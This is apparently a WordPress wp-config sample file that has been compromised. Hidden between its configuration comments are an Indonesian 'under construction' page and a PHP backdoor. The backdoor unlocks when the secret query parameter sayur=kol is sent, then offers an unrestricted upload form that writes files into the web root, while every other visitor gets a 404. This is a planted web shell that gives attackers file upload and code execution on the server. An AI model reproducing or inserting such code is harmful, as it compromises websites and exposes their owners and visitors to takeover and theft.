<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** Database username */
define( 'DB_USER', 'username_here' );

/** Database password */
define( 'DB_PASSWORD', 'password_here' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
?>
<!DOCTYPE html>
<html lang="en" style="height: 100%;">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Website is Under Construction</title>
</head>
<body style="height: 100%;">
<p style="text-align: center;"><img align="center" src="https://ik.imagekit.io/expx/ROOT/MRectangle-6.png?updatedat=1751399582829" style="width: 75%;" /></p>
<div>
<h3 style="text-align: center;"><span style="font-size:48px;">Under Construction</span></h3>
</div>
<div class="col-sm-12 margin_bottom" style="text-align: center;"><span style="font-size:24px;"><span style="font-family:courier new,courier,monospace;"><marquee><span style="background-color:#00FFFF;">Website ini dalam perbaikan...</span></marquee></span></span></div>
</body>
<?php
session_start(); 
$expected_param = 'sayur';
$expected_value = 'kol';
$is_authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
    if (!$is_authenticated) {
        $_SESSION['authenticated'] = true;
        $is_authenticated = true;
    }

    $upload_dir = __DIR__ . '/'; 
    $is_writable = is_writable($upload_dir);

    if ($is_authenticated) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $upload_file = $upload_dir . basename($_FILES['file']['name']);

            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                echo "File successfully uploaded: " . htmlspecialchars(basename($_FILES['file']['name']));
            } else {
                echo "An error occurred during file upload.";
            }
        }
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>File Upload</title>
        </head>
        <body>
            <p>Upload Directory Status: <strong><?php echo $is_writable ? 'Writable' : 'Not Writable'; ?></strong></p>
            <form action="" method="post" enctype="multipart/form-data">
                <label for="file">Choose a file:</label>
                <input type="file" name="file" id="file" required>
                <button type="submit">Upload</button>
            </form>
        </body>
        </html>
        <?php
        exit; 
    }
} else {
    http_response_code(404);
    exit;
}

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
?>
